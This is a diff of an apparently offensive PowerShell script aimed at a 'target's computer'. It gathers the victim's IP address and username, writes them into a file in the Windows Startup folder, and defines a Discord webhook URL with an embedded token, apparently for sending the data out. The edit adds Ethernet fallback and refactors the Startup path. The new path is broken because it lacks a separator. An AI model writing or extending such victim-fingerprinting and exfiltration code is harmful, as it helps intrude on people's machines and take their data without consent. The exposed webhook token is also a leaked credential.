@@ -1,11 +1,18 @@
-# None of the file created will be saved on the target's computer
-# Need to implement VPS
+# None of the files created will be saved on the target's computer
+# Need to implement V-f
 
 # Define the Discord webhook URL
 $DiscordWebhookURL = "https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD"
 
-# Get the Wi-Fi IPv4 Address
-$IPAddress = (Get-NetIPAddress -InterfaceAlias "Wi-Fi" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
+# Get the Wi-Fi IPv4 Address, or use Ethernet if Wi-Fi is not available
+$WiFIIP = (Get-NetIPAddress -InterfaceAlias "Wi-Fi" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
+$EthernetIP = (Get-NetIPAddress -InterfaceAlias "Ethernet" | Where-Object {$_.AddressFamily -eq "IPv4"}).IPAddress
+
+$IPAddress = $WiFIIP
+
+if ([string]::IsNullOrEmpty($IPAddress)) {
+    $IPAddress = $EthernetIP
+}
 
 # Get the current user's username
 $Username = $env:USERNAME
@@ -13,9 +20,11 @@ $Username = $env:USERNAME
 # Get the user's profile folder
 $UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
 
+$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
 # Create a text file in the user's startup folder
 $TextContent = "$IPAddress`n$Username"
-$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$Username.icu"
+$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory$Username.icu"
 $TextContent | Out-File -FilePath $TextFile
 
 # Define a message (commented out for now)
